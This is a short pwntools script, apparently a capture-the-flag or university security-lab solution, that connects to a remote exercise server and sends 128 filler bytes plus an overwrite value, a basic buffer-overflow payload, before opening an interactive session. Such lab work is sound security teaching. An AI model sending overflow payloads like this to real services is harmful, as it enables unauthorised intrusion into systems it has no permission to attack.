from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22151

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### run a local process
# s = process('./my_program', shell=True)

### interact with it

msg = b'A'*128+b'\x01\x00\x00\x00'
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

s.interactive()


# print(s.recv())
# s.recvall()
# s.recvuntil(b'Message : ')
# s.recvline()

# s.send(msg + b'\n')
# s.sendline(msg)

# s.interactive()
